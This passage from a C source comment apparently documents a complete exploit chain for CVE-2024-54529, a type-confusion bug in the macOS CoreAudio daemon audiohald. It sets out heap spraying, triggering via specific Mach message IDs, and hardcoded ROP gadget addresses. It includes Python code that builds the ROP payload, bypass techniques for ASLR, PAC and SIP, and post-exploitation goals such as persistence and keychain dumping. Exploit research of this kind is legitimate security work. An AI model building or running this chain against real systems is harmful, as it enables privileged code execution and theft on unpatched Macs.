 *     - blr x8 transfers control to ROP chain!
 *
 * =============================================================================
 * =============================================================================
 * SECTION F: EXPLOITATION FLOW - PUTTING IT ALL TOGETHER
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * F.1 COMPLETE EXPLOITATION TIMELINE
 * -----------------------------------------------------------------------------
 *
 * INITIALIZATION:
 *
 *   t=0: Exploit starts
 *         |
 *         +-> task_get_bootstrap_port()
 *         |     Get bootstrap port from kernel
 *         |
 *         +-> bootstrap_look_up("com.apple.audio.audiohald")
 *         |     Get send right to audiohald
 *         |
 *         +-> Send message 1010000 (XSystem_Open)
 *               Register as client
 *
 * HEAP GROOMING PHASE:
 *
 *   t=1: For i = 1 to num_iterations:
 *         |
 *         +-> Send message 1010005 (CreateMetaDevice)
 *         |     Creates MetaDevice object_i
 *         |
 *         +-> Send message 1010034 (SetPropertyData)
 *         |     selector='acom', data=plist with payload strings
 *         |
 *         +-> audiohald parses plist:
 *         |     - Creates CFArray
 *         |     - Creates allocs_per_iteration CFStrings
 *         |     - Each CFString backing buffer = 1168 bytes
 *         |     - Total: iterations Ã— allocs heap allocations
 *         |
 *         +-> HEAP NOW FILLED WITH CONTROLLED DATA
 *
 * HOLE CREATION PHASE:
 *
 *   t=2: For i = 1 to num_frees:
 *         |
 *         +-> Send message 1010034 (SetPropertyData)
 *         |     selector='acom', data=small plist
 *         |
 *         +-> audiohald replaces property:
 *         |     - Old CFArray released
 *         |     - All CFStrings in array released
 *         |     - Backing buffers freed
 *         |
 *         +-> HOLES CREATED IN HEAP
 *         |     (Freed memory still contains payload!)
 *
 * VULNERABLE OBJECT CREATION:
 *
 *   t=3: For i = 1 to num_engine_objects:
 *         |
 *         +-> Send message 1010042 (GetPropertyData)
 *         |     selector='mktp' (make tap)
 *         |
 *         +-> audiohald creates Engine object:
 *         |     - new EngineObject() called
 *         |     - malloc() may return freed slot!
 *         |     - Engine object partially overwrites payload
 *         |     - Some payload bytes remain in allocation
 *         |
 *         +-> ENGINE OBJECT IN CONTROLLED MEMORY
 *
 * EXPLOITATION PHASE:
 *
 *   t=4: For i = 1 to num_attempts:
 *         |
 *         +-> Enumerate Engine objects (messages 1010002)
 *         |
 *         +-> Select random Engine object
 *         |
 *         +-> Send message 1010059 (FetchWorkgroupPort)
 *         |     object_id = selected_engine_id
 *         |
 *         +-> audiohald processes message:
 *         |     - Looks up object by ID
 *         |     - Calls obj->FetchWorkgroupPort()
 *         |     - Virtual call dereferences vtable
 *         |
 *         +-> IF SUCCESSFUL:
 *         |     - vtable points to controlled data
 *         |     - Function pointer = first gadget
 *         |     - ROP chain executes
 *         |     - Arbitrary code execution!
 *         |
 *         +-> IF UNSUCCESSFUL:
 *               - Crash (invalid pointer)
 *               - audiohald respawns via launchd
 *               - Try again with different object
 *
 * -----------------------------------------------------------------------------
 * F.2 SUCCESS CONDITIONS
 * -----------------------------------------------------------------------------
 *
 * For successful exploitation, these must align:
 *
 *   1. HEAP LAYOUT:
 *      - Spray allocations must be in same heap region as Engine objects
 *      - Freed slots must be correct size for Engine objects
 *
 *   2. ALLOCATION REUSE:
 *      - Engine object allocation must land in a freed slot
 *      - Slot must contain valid ROP payload
 *
 *   3. OBJECT CORRUPTION:
 *      - Specific memory layout allows controlled vtable
 *      - Or use-after-free leaves stale pointer
 *      - Or type confusion treats wrong object as Engine
 *
 *   4. ROP CHAIN:
 *      - Gadget addresses must be correct for ASLR slide
 *      - Stack/register setup must be achievable
 *      - PAC bypass if applicable
 *
 * PROBABILISTIC NATURE:
 *
 *   Heap exploitation is probabilistic. Multiple attempts often needed.
 *   --attempts parameter controls retry count.
 *   Each attempt may hit different Engine object with different heap state.
 *
 * -----------------------------------------------------------------------------
 * F.3 POST-EXPLOITATION
 * -----------------------------------------------------------------------------
 *
 * Once ROP chain executes in audiohald:
 *
 *   TYPICAL GOALS:
 *
 *   1. PERSISTENCE:
 *      - Write payload to disk
 *      - Modify launchd plist
 *      - Hook system libraries
 *
 *   2. PRIVILEGE ESCALATION:
 *      - audiohald runs as root!
 *      - Can access kernel interfaces
 *      - Can escalate to kernel
 *
 *   3. SANDBOX ESCAPE:
 *      - audiohald not sandboxed (or less restricted)
 *      - Can access filesystem
 *      - Can spawn processes
 *
 *   4. INFORMATION GATHERING:
 *      - Read files
 *      - Dump keychains
 *      - Access other processes
 *
 * COMMON ROP OBJECTIVES:
 *
 *   - Call mprotect() to make heap executable
 *   - Then jump to shellcode in heap
 *
 *   - Call dlopen() to load malicious dylib
 *
 *   - Call system() or posix_spawn() to run command
 *
 *   - Pivot stack to controlled memory for larger ROP chain
 *
 * =============================================================================
 * =============================================================================
 * SECTION G: MEMORY LAYOUT DIAGRAMS
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * G.1 AUDIOHALD HEAP BEFORE SPRAY
 * -----------------------------------------------------------------------------
 *
 *   ADDRESS SPACE:
 *
 *   0x00000001_00000000  +---------------------------+
 *                        | audiohald .text segment   |
 *                        | (code)                    |
 *                        +---------------------------+
 *                        | audiohald .data segment   |
 *                        | (globals)                 |
 *                        +---------------------------+
 *   0x00000001_xxxxxxxx  | Heap (grows up)           |
 *                        |  +---------------------+  |
 *                        |  | Existing objects    |  |
 *                        |  | from other clients  |  |
 *                        |  +---------------------+  |
 *                        |  | Free space          |  |
 *                        |  |                     |  |
 *                        +---------------------------+
 *   0x00007fff_xxxxxxxx  | Shared libraries          |
 *                        | (dyld cache)              |
 *                        +---------------------------+
 *                        | Stack (grows down)        |
 *   0x00007fff_ffffffff  +---------------------------+
 *
 * -----------------------------------------------------------------------------
 * G.2 AUDIOHALD HEAP AFTER SPRAY
 * -----------------------------------------------------------------------------
 *
 *   HEAP REGION (simplified):
 *
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 1   | CFString bufs  | MetaDevice 2   | CFString bufs  |
 *   | (object)       | (payloadÃ—50)   | (object)       | (payloadÃ—50)   |
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 3   | CFString bufs  | MetaDevice 4   | CFString bufs  |
 *   | (object)       | (payloadÃ—50)   | (object)       | (payloadÃ—50)   |
 *   +----------------+----------------+----------------+----------------+
 *   | ...continues for num_iterations...                                |
 *   +-------------------------------------------------------------------+
 *
 *   Each CFString buffer:
 *   +------------------+
 *   | ROP payload      |
 *   | (1152 bytes)     |
 *   | + malloc header  |
 *   +------------------+
 *   Total: ~1168 bytes
 *
 * -----------------------------------------------------------------------------
 * G.3 HEAP AFTER FREEING
 * -----------------------------------------------------------------------------
 *
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 1   | FREED SLOTS    | MetaDevice 3   | FREED SLOTS    |
 *   | (still alloc)  | (payload data  | (still alloc)  | (payload data  |
 *   |                |  still there!) |                |  still there!) |
 *   +----------------+----------------+----------------+----------------+
 *
 *   FREELIST:
 *   slot_A -> slot_B -> slot_C -> ... -> NULL
 *
 *   Each freed slot:
 *   +------------------+
 *   | next_free ptr    |  <- malloc uses for freelist
 *   +------------------+
 *   | (old payload     |  <- Still contains ROP data!
 *   |  data remains)   |
 *   +------------------+
 *
 * -----------------------------------------------------------------------------
 * G.4 HEAP AFTER ENGINE CREATION
 * -----------------------------------------------------------------------------
 *
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 1   | ENGINE OBJECT  | MetaDevice 3   | ENGINE OBJECT  |
 *   | (still alloc)  | (in old slot)  | (still alloc)  | (in old slot)  |
 *   +----------------+----------------+----------------+----------------+
 *
 *   Engine object in freed slot:
 *   +------------------+
 *   | vtable ptr       |  <- Written by EngineObject constructor
 *   +------------------+
 *   | object_id        |  <- Written
 *   +------------------+
 *   | type             |  <- Written
 *   +------------------+
 *   | ... fields ...   |  <- Partially written
 *   +------------------+
 *   | RESIDUAL PAYLOAD |  <- NOT overwritten! (beyond object size)
 *   | (ROP gadgets,    |
 *   |  fake vtable)    |
 *   +------------------+
 *
 * -----------------------------------------------------------------------------
 * G.5 EXPLOITATION SCENARIO - CORRUPTED VTABLE
 * -----------------------------------------------------------------------------
 *
 *   LEGITIMATE OBJECT:
 *
 *   EngineObject @ 0x100500000:
 *   +------------------+
 *   | vtable = 0x1000  |-----> Legitimate vtable @ 0x100001000:
 *   +------------------+       +------------------+
 *   | id = 42          |       | destructor       |
 *   +------------------+       +------------------+
 *   | type = 'engn'    |       | GetObjectID      |
 *   +------------------+       +------------------+
 *   | ...              |       | FetchWorkgroup   |-----> legit code
 *   +------------------+       +------------------+
 *
 *   CORRUPTED OBJECT (in controlled memory):
 *
 *   "EngineObject" @ 0x100600000:
 *   +------------------+
 *   | vtable = 0x60100 |-----> Fake vtable @ 0x100600100:
 *   +------------------+       +------------------+
 *   | (garbage)        |       | gadget1_addr     |
 *   +------------------+       +------------------+
 *   | (garbage)        |       | gadget2_addr     |
 *   +------------------+       +------------------+
 *   | (more payload)   |       | gadget3_addr     |-----> ROP chain!
 *   +------------------+       +------------------+
 *
 * =============================================================================
 * =============================================================================
 * SECTION H: DEBUGGING AND ANALYSIS TECHNIQUES
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * H.1 DEBUGGING AUDIOHALD
 * -----------------------------------------------------------------------------
 *
 * ATTACHING LLDB:
 *
 *   $ sudo lldb
 *   (lldb) process attach --name audiohald
 *
 * USEFUL BREAKPOINTS:
 *
 *   // Break on message receive:
 *   (lldb) b mach_msg
 *
 *   // Break on specific handler:
 *   (lldb) b _XIOContext_FetchWorkgroupPort
 *
 *   // Break on allocation:
 *   (lldb) b malloc
 *   (lldb) b calloc
 *
 *   // Break on free:
 *   (lldb) b free
 *
 * EXAMINING HEAP:
 *
 *   // Show malloc zones:
 *   (lldb) expr (void)malloc_zone_print(malloc_default_zone(), 1)
 *
 *   // Find allocations:
 *   (lldb) memory find --expression "0xDEADBEEF" --count 10
 *
 * -----------------------------------------------------------------------------
 * H.2 HEAP ANALYSIS
 * -----------------------------------------------------------------------------
 *
 * USING heap COMMAND:
 *
 *   $ sudo heap audiohald
 *
 *   Shows all heap allocations by class/size.
 *   Look for CFString allocations of ~1168 bytes.
 *
 * USING vmmap:
 *
 *   $ vmmap audiohald
 *
 *   Shows virtual memory regions.
 *   Look for MALLOC regions and their sizes.
 *
 * USING MallocStackLogging:
 *
 *   $ export MallocStackLogging=1
 *   $ /usr/libexec/audiohald
 *
 *   Records allocation call stacks.
 *   Use malloc_history to analyze.
 *
 * -----------------------------------------------------------------------------
 * H.3 MESSAGE TRACING
 * -----------------------------------------------------------------------------
 *
 * USING dtrace:
 *
 *   #!/usr/sbin/dtrace -s
 *
 *   syscall::mach_msg*:entry
 *   /execname == "audiohald"/
 *   {
 *       printf("mach_msg from %s\n", execname);
 *       ustack();
 *   }
 *
 * USING fs_usage:
 *
 *   $ sudo fs_usage -w audiohald
 *
 *   Shows file and Mach port activity.
 *
 * -----------------------------------------------------------------------------
 * H.4 CRASH ANALYSIS
 * -----------------------------------------------------------------------------
 *
 * CRASH LOGS:
 *
 *   ~/Library/Logs/DiagnosticReports/audiohald_*.crash
 *   /Library/Logs/DiagnosticReports/audiohald_*.crash
 *
 * CRASH LOG CONTENTS:
 *
 *   - Exception type (EXC_BAD_ACCESS, EXC_BAD_INSTRUCTION)
 *   - Faulting address
 *   - Register state at crash
 *   - Thread backtraces
 *   - Binary images (for ASLR slide)
 *
 * ANALYZING CRASH:
 *
 *   1. Find faulting instruction
 *   2. Check if address is in our controlled range
 *   3. Verify ROP chain layout vs crash
 *   4. Adjust payload and retry
 *
 * =============================================================================
 * =============================================================================
 * SECTION I: MITIGATIONS AND BYPASS TECHNIQUES
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * I.1 ASLR (ADDRESS SPACE LAYOUT RANDOMIZATION)
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Randomizes base addresses of code/data/heap/stack
 *   - Different addresses each process launch
 *   - Attacker can't hardcode addresses
 *
 * macOS ASLR:
 *   - dyld shared cache: Randomized per boot
 *   - Heap: Randomized per allocation
 *   - Stack: Randomized per thread
 *
 * BYPASS TECHNIQUES:
 *
 *   1. INFORMATION LEAK:
 *      - Find vulnerability that discloses addresses
 *      - Calculate ASLR slide from leaked address
 *      - Adjust ROP gadget addresses
 *
 *   2. HEAP SPRAY:
 *      - Spray large amount of data
 *      - Some addresses become predictable
 *      - Use relative addressing within spray
 *
 *   3. BRUTE FORCE (limited):
 *      - macOS has limited ASLR entropy
 *      - Some attacks succeed probabilistically
 *
 * -----------------------------------------------------------------------------
 * I.2 PAC (POINTER AUTHENTICATION CODES)
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES (Apple Silicon only):
 *   - Cryptographic signature added to pointers
 *   - Signature verified before use
 *   - Invalid signature = crash
 *
 * PROTECTED POINTERS:
 *   - Return addresses (PACIBSP)
 *   - Function pointers
 *   - Vtable pointers (in some cases)
 *
 * BYPASS TECHNIQUES:
 *
 *   1. SIGNING GADGETS:
 *      - Find gadget that signs attacker-controlled value
 *      - Use legitimate signing to create valid pointer
 *
 *   2. PAC ORACLE:
 *      - Information leak reveals valid signatures
 *      - Reuse observed signatures
 *
 *   3. CONTEXT CONFUSION:
 *      - PAC uses context for signing
 *      - Different context = different signature
 *      - Find context where attacker controls inputs
 *
 *   4. JIT SPRAY:
 *      - JIT compilers create executable code
 *      - Spray JIT to create useful gadgets
 *      - JIT code may not be PAC-protected
 *
 * -----------------------------------------------------------------------------
 * I.3 STACK CANARIES
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Random value placed on stack before return address
 *   - Checked before function return
 *   - Buffer overflow would corrupt canary
 *
 * NOT RELEVANT HERE:
 *   - This exploit uses heap corruption, not stack
 *   - No stack buffer overflows involved
 *
 * -----------------------------------------------------------------------------
 * I.4 SANDBOXING
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Restricts process capabilities
 *   - Limits file access, network, IPC
 *   - Defined by sandbox profile
 *
 * audiohald SANDBOX:
 *   - Less restricted than typical apps
 *   - Needs access to audio hardware
 *   - Can perform many privileged operations
 *
 * POST-EXPLOITATION:
 *   - May need sandbox escape for full system access
 *   - Or operate within audiohald's capabilities
 *
 * -----------------------------------------------------------------------------
 * I.5 SIP (SYSTEM INTEGRITY PROTECTION)
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Protects system files and processes
 *   - Even root can't modify protected paths
 *   - Restricts kernel extension loading
 *
 * IMPACT:
 *   - Can't modify /System, /usr (except /usr/local)
 *   - Can't attach debugger to Apple processes
 *   - Can't load unsigned kexts
 *
 * BYPASS:
 *   - Requires kernel exploit to disable
 *   - Or boot to recovery mode
 *
 * =============================================================================
 * =============================================================================
 * SECTION J: REFERENCES AND FURTHER READING
 * =============================================================================
 * =============================================================================
 *
 * XNU KERNEL SOURCE:
 *   https://opensource.apple.com/source/xnu/
 *   Key files: osfmk/ipc/, osfmk/vm/, bsd/kern/
 *
 * LIBMALLOC SOURCE:
 *   https://opensource.apple.com/source/libmalloc/
 *   Key files: src/magazine_malloc.c, src/nano_malloc.c
 *
 * MACH IPC DOCUMENTATION:
 *   "Mach 3 Kernel Interfaces" (CMU)
 *   "Mac OS X Internals" by Amit Singh
 *
 * EXPLOITATION TECHNIQUES:
 *   "The Art of Exploitation" by Jon Erickson
 *   "A Guide to Kernel Exploitation" by Perla & Oldani
 *   Project Zero blog posts on iOS/macOS
 *
 * ROP TECHNIQUES:
 *   "Return-Oriented Programming" by Shacham et al.
 *   "Q: Exploit Hardening Made Easy" (ROP compiler)
 *   Ropper, ROPgadget tools
 *
 * PAC BYPASS RESEARCH:
 *   "Examining Pointer Authentication on the iPhone XS" (Google P0)
 *   "PACMAN: Attacking ARM Pointer Authentication" (MIT)
 *
 * COREAUDIO INTERNALS:
 *   Apple Developer Documentation: Audio HAL
 *   Reverse engineering audiohald with Hopper/IDA
 *
 * =============================================================================
 * END OF DEEP TECHNICAL DOCUMENTATION
 * =============================================================================
 */

/*
 * #############################################################################
 * #############################################################################
 * ##                                                                         ##
 * ##    PART 3: CVE-2024-54529 COMPLETE EXPLOIT CHAIN DOCUMENTATION          ##
 * ##                                                                         ##
 * #############################################################################
 * #############################################################################
 *
 * This section provides atomic-level detail on the complete exploit chain:
 *   - CVE-2024-54529 vulnerability specifics
 *   - build_rop.py: ROP chain construction
 *   - exploit.mm: Heap spray and trigger implementation
 *   - run_exploit.py: Orchestration and automation
 *   - Mach message structures from Xcode SDK
 *   - x86-64 syscall conventions and gadget mechanics
 *
 * =============================================================================
 * =============================================================================
 * SECTION K: CVE-2024-54529 - THE VULNERABILITY
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * K.1 VULNERABILITY OVERVIEW
 * -----------------------------------------------------------------------------
 *
 * CVE IDENTIFIER:     CVE-2024-54529
 * AFFECTED COMPONENT: CoreAudio framework / audiohald daemon
 * VULNERABILITY TYPE: Type Confusion / Insufficient Type Validation
 * CVSS v3.1 SCORE:    7.8 (HIGH)
 * CVSS VECTOR:        CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
 *
 * TIMELINE:
 *   2024-10-09: Reported to Apple by Dillon Franke (Google Project Zero)
 *   2024-12-11: Fixed in macOS Sequoia 15.2, Sonoma 14.7.2, Ventura 13.7.2
 *   2025-01-07: 90-day disclosure deadline
 *
 * AFFECTED VERSIONS:
 *   - macOS Sequoia < 15.2
 *   - macOS Sonoma < 14.7.2
 *   - macOS Ventura < 13.7.2
 *
 * REFERENCE:
 *   https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
 *   https://nvd.nist.gov/vuln/detail/CVE-2024-54529
 *   https://github.com/googleprojectzero/p0tools/blob/master/CoreAudioFuzz/
 *
 * -----------------------------------------------------------------------------
 * K.2 ROOT CAUSE ANALYSIS
 * -----------------------------------------------------------------------------
 *
 * THE BUG:
 *
 *   The vulnerability exists in multiple handler functions within audiohald
 *   that process IOContext-related operations. These handlers:
 *
 *   1. Receive an object_id from the Mach message
 *   2. Call HALS_ObjectMap::CopyObjectByObjectID(object_id) to retrieve object
 *   3. DEREFERENCE the object at fixed offsets WITHOUT checking the type
 *   4. Call virtual functions through the assumed vtable layout
 *
 * VULNERABLE CODE PATTERN (pseudocode):
 *
 *   void _XIOContext_Fetch_Workgroup_Port(mach_msg_header_t *msg) {
 *       uint32_t object_id = *(uint32_t*)(msg + 0x30);
 *
 *       // BUG: No type check before dereferencing!
 *       HALS_Object *obj = HALS_ObjectMap::CopyObjectByObjectID(object_id);
 *
 *       if (obj) {
 *           // Assumes obj is an IOContext, but could be ANY object type!
 *           void *ptr = *(void**)(obj + 0x68);  // Dereference at offset
 *           void (*func)(void*) = *(void**)(ptr + 0x168);  // Get func pointer
 *           func(obj);  // CALL THROUGH CONTROLLED POINTER!
 *       }
 *   }
 *
 * TYPE CONFUSION SCENARIO:
 *
 *   Object types have different memory layouts:
 *
 *   IOContext (expected):           Engine (actual):
 *   +------------------+            +------------------+
 *   | vtable           | 0x00       | vtable           | 0x00
 *   +------------------+            +------------------+
 *   | type = "ioct"    | 0x08       | type = "ngne"    | 0x08
 *   +------------------+            +------------------+
 *   | ...              |            | ...              |
 *   +------------------+            +------------------+
 *   | io_context_ptr   | 0x68  <--- | DIFFERENT DATA   | 0x68
 *   +------------------+            +------------------+
 *
 *   When the handler accesses offset 0x68 expecting an IOContext,
 *   but receives an Engine object, the data at that offset is
 *   interpreted incorrectly.
 *
 * VULNERABLE HANDLERS (Message IDs):
 *
 *   1010010 - XIOContext_SetClientControlPort
 *   1010011 - XIOContext_Start
 *   1010012 - XIOContext_Stop
 *   1010054 - XIOContext_StartAtTime
 *   1010058 - XIOContext_Start_With_WorkInterval
 *   1010059 - XIOContext_Fetch_Workgroup_Port  <-- USED IN THIS EXPLOIT
 *
 * -----------------------------------------------------------------------------
 * K.3 APPLE'S FIX
 * -----------------------------------------------------------------------------
 *
 * Apple's patch adds type validation before dereferencing:
 *
 * PATCHED CODE (pseudocode):
 *
 *   void _XIOContext_Fetch_Workgroup_Port(mach_msg_header_t *msg) {
 *       uint32_t object_id = *(uint32_t*)(msg + 0x30);
 *
 *       HALS_Object *obj = HALS_ObjectMap::CopyObjectByObjectID(object_id);
 *
 *       if (obj) {
 *           // NEW: Check object type before use
 *           if (strcmp(obj->type, "ioct") != 0) {
 *               return kAudioHardwareBadObjectError;
 *           }
 *
 *           // Now safe to dereference as IOContext
 *           void *ptr = *(void**)(obj + 0x68);
 *           ...
 *       }
 *   }
 *
 * This pattern (checking type before use) was already present in some
 * defensive handlers like _XIOContext_PauseIO, but missing in the
 * vulnerable ones.
 *
 * =============================================================================
 * =============================================================================
 * SECTION L: build_rop.py - ROP CHAIN CONSTRUCTION
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * L.1 FILE OVERVIEW
 * -----------------------------------------------------------------------------
 *
 * FILE: exploit/build_rop.py
 * PURPOSE: Generate the ROP payload binary (rop_payload.bin)
 * OUTPUT: 1152-byte binary file containing ROP chain
 * USAGE: python3 build_rop.py  (run before exploit)
 *
 * The ROP chain performs a simple proof-of-concept action:
 *   - Creates a file at /Library/Preferences/Audio/malicious.txt
 *   - This proves arbitrary code execution with audiohald privileges
 *
 * -----------------------------------------------------------------------------
 * L.2 GADGET ADDRESSES
 * -----------------------------------------------------------------------------
 *
 * NOTE: These addresses are specific to a particular macOS version/build.
 * They must be updated for different macOS versions due to ASLR and updates.
 *
 * Addresses from build_rop.py (x86-64):
 *
 *   STACK_PIVOT_GADGET  = 0x7ff810b908a4
 *     Instruction: xchg rsp, rax ; xor edx, edx ; ret
 *     Purpose: Pivots stack to attacker-controlled memory
 *     Library: Likely libsystem_c.dylib or similar
 *
 *   POP_RDI_GADGET      = 0x7ff80f185186
 *     Instruction: pop rdi ; ret
 *     Purpose: Load first argument (rdi) for syscall
 *
 *   POP_RSI_GADGET      = 0x7ff811fa1e36
 *     Instruction: pop rsi ; ret
 *     Purpose: Load second argument (rsi) for syscall
 *
 *   POP_RDX_GADGET      = 0x7ff811cce418
 *     Instruction: pop rdx ; ret
 *     Purpose: Load third argument (rdx) for syscall
 *
 *   POP_RAX_GADGET      = 0x7ff811c93b09
 *     Instruction: pop rax ; ret
 *     Purpose: Load syscall number into rax
 *
 *   ADD_HEX30_RSP       = 0x7ff80f17d035
 *     Instruction: add rsp, 0x30 ; pop rbp ; ret
 *     Purpose: Skip over inline string data
 *
 *   LOAD_RSP_PLUS_EIGHT = 0x7ffd1491ac80
 *     Instruction: lea rax, [rsp + 8] ; ret
 *     Purpose: Get pointer to stack (inline string)
 *
 *   MOV_RAX_TO_RSI      = 0x7ff80f41b060
 *     Instruction: mov rsi, rax ; mov rax, rsi ; pop rbp ; ret
 *     Purpose: Move value to rsi
 *
 *   MOV_RSI_TO_RDI      = 0x7ff827af146d
 *     Instruction: mov rdi, rsi ; mov rax, rdi ; mov rdx, rdi ; ret
 *     Purpose: Move value to rdi (first syscall argument)
 *
 *   SYSCALL             = 0x7ff80f1534d0
 *     Instruction: syscall
 *     Purpose: Execute system call
 *
 * FINDING GADGETS:
 *
 *   Tools to find ROP gadgets:
 *     - ROPgadget: ROPgadget --binary /usr/lib/libSystem.B.dylib
 *     - Ropper: ropper -f /usr/lib/libSystem.B.dylib
 *     - radare2: /R pop rdi
 *
 *   Example with ROPgadget:
 *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "pop rdi"
 *     0x00001234 : pop rdi ; ret
 *
 * -----------------------------------------------------------------------------
 * L.3 x86-64 SYSCALL CONVENTION
 * -----------------------------------------------------------------------------
 *
 * On macOS x86-64, syscalls use the following convention:
 *
 *   REGISTER    PURPOSE
 *   --------    -------
 *   rax         Syscall number (with 0x2000000 prefix for BSD syscalls)
 *   rdi         First argument
 *   rsi         Second argument
 *   rdx         Third argument
 *   r10         Fourth argument (rcx is used by syscall instruction)
 *   r8          Fifth argument
 *   r9          Sixth argument
 *
 * SYSCALL NUMBER ENCODING:
 *
 *   macOS uses a class prefix in the syscall number:
 *
 *     0x0000000 - Mach traps (negative in traditional encoding)
 *     0x1000000 - Mach traps (alternative)
 *     0x2000000 - BSD syscalls (standard POSIX calls)
 *     0x3000000 - Machine-dependent calls
 *
 *   BSD syscall numbers from <sys/syscall.h>:
 *
 *     #define SYS_open    5      -> 0x2000005 with class prefix
 *     #define SYS_close   6      -> 0x2000006
 *     #define SYS_read    3      -> 0x2000003
 *     #define SYS_write   4      -> 0x2000004
 *     #define SYS_mmap    197    -> 0x20000C5
 *
 * open() SYSCALL:
 *
 *   int open(const char *path, int flags, mode_t mode);
 *
 *   Arguments:
 *     rdi = path   (pointer to filename string)
 *     rsi = flags  (O_CREAT | O_WRONLY = 0x201)
 *     rdx = mode   (0644 = 0x1A4)
 *     rax = 0x2000005 (syscall number)
 *
 * -----------------------------------------------------------------------------
 * L.4 ROP CHAIN STRUCTURE
 * -----------------------------------------------------------------------------
 *
 * The ROP chain in build_rop.py constructs an open() syscall:
 *
 * PAYLOAD LAYOUT (1152 bytes total):
 *
 *   Offset  Content                          Purpose
 *   ------  -------                          -------
 *   0x000   LOAD_RSP_PLUS_EIGHT addr         First gadget: lea rax, [rsp+8]
 *   0x008   ADD_HEX30_RSP addr               Skip inline string
 *   0x010   "/Library/Preferences/..."       41-byte inline filename
 *   0x039   padding (0x42 bytes)             Filler for pop rbp
 *   0x???   MOV_RAX_TO_RSI addr              Move string ptr to rsi
 *   0x???   0x4242424242424242               pop rbp filler
 *   0x???   MOV_RSI_TO_RDI addr              Move to rdi (arg1)
 *   0x???   POP_RSI_GADGET addr              Prepare to load flags
 *   0x???   0x0000000000000201               O_CREAT | O_WRONLY
 *   0x???   POP_RDX_GADGET addr              Prepare to load mode
 *   0x???   0x00000000000001A4               0644 permissions
 *   0x???   POP_RAX_GADGET addr              Prepare syscall number
 *   0x???   0x0000000002000005               open() syscall number
 *   0x???   SYSCALL addr                     Execute syscall!
 *   ...
 *   0x168   STACK_PIVOT_GADGET addr          ENTRY POINT for vtable call
 *   ...
 *   0x47F   (padding to 1152 bytes)
 *
 * EXECUTION FLOW:
 *
 *   1. Vulnerability calls vtable function at offset 0x168
 *   2. Stack pivots: xchg rsp, rax (rax points to our payload)
 *   3. RSP now points to our ROP chain at offset 0x000
 *   4. First gadget: lea rax, [rsp+8] - get pointer to inline string
 *   5. add rsp, 0x30 - skip over the string, pop rbp
 *   6. Chain continues, moving string pointer to rdi
 *   7. Set rsi = 0x201 (O_CREAT | O_WRONLY)
 *   8. Set rdx = 0x1A4 (mode 0644)
 *   9. Set rax = 0x2000005 (open syscall)
 *   10. syscall - creates the file!
 *
 * WHY OFFSET 0x168?
 *
 *   The vulnerable code dereferences at offset 0x168 to get a function pointer:
 *
 *     void (*func)(void*) = *(void**)(ptr + 0x168);
 *     func(obj);
 *
 *   By placing STACK_PIVOT_GADGET at offset 0x168 in our payload,
 *   when the vtable is read from our controlled memory, the function
 *   pointer points to our stack pivot gadget.
 *
 * -----------------------------------------------------------------------------
 * L.5 INLINE STRING TECHNIQUE
 * -----------------------------------------------------------------------------
 *
 * The ROP chain embeds the filename directly in the payload:
 *
 *   INLINE_STRING = b"/Library/Preferences/Audio/malicious.txt\x00"
 *
 * This is 41 bytes including the null terminator.
 *
 * WHY INLINE?
 *
 *   1. No need to find string in memory
 *   2. String address is calculated relative to RSP
 *   3. lea rax, [rsp + 8] gives us the address
 *   4. Simpler than heap spray for string
 *
 * PATH CHOICE:
 *
 *   /Library/Preferences/Audio/ is chosen because:
 *   1. audiohald has write permissions there
 *   2. Proves code execution with elevated privileges
 *   3. Doesn't require root (audiohald runs as _coreaudiod)
 *
 * -----------------------------------------------------------------------------
 * L.6 PYTHON CODE WALKTHROUGH
 * -----------------------------------------------------------------------------
 *
 * Key code from build_rop.py:
 *
 *   # Helper for 64-bit little-endian packing
 *   def p64(val):
 *       return struct.pack("<Q", val)
 *
 *   # Build the ROP chain
 *   rop = bytearray(p64(LOAD_RSP_PLUS_EIGHT))  # First: get string address
 *   rop += p64(ADD_HEX30_RSP)                   # Skip string
 *   rop += INLINE_STRING                        # The filename
 *   rop += b'\x42' * 15                         # Padding
 *   rop += p64(MOV_RAX_TO_RSI)                  # String addr -> rsi
 *   rop += p64(0x4242424242424242)              # pop rbp filler
 *   rop += p64(MOV_RSI_TO_RDI)                  # rsi -> rdi (arg1)
 *   rop += p64(POP_RSI_GADGET)                  # Prepare flags
 *   rop += p64(0x201)                           # O_CREAT | O_WRONLY
 *   rop += p64(POP_RDX_GADGET)                  # Prepare mode
 *   rop += p64(0x1A4)                           # 0644
 *   rop += p64(POP_RAX_GADGET)                  # Prepare syscall num
 *   rop += p64(0x2000005)                       # SYS_open
 *   rop += p64(SYSCALL)                         # Execute!
 *
 *   # Pad to 1152 bytes
 *   rop += b'\x42' * (1152 - len(rop))
 *
 *   # Place stack pivot at vtable offset
 *   rop[0x168:0x170] = p64(STACK_PIVOT_GADGET)
 *
 *   # Write to file
 *   with open("rop_payload.bin", "wb") as f:
 *       f.write(rop)
 *
 * =============================================================================
 * =============================================================================
 * SECTION M: exploit.mm - DETAILED CODE ANALYSIS
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * M.1 FILE OVERVIEW
 * -----------------------------------------------------------------------------
 *
 * FILE: exploit/exploit.mm
 * PURPOSE: Main exploit implementation (Objective-C++)
 * COMPILATION: clang++ -framework CoreFoundation -framework CoreAudio exploit.mm -o exploit
 *
 * The exploit performs:
 *   1. Connect to audiohald via Mach IPC
 *   2. Register as a client (XSystem_Open)
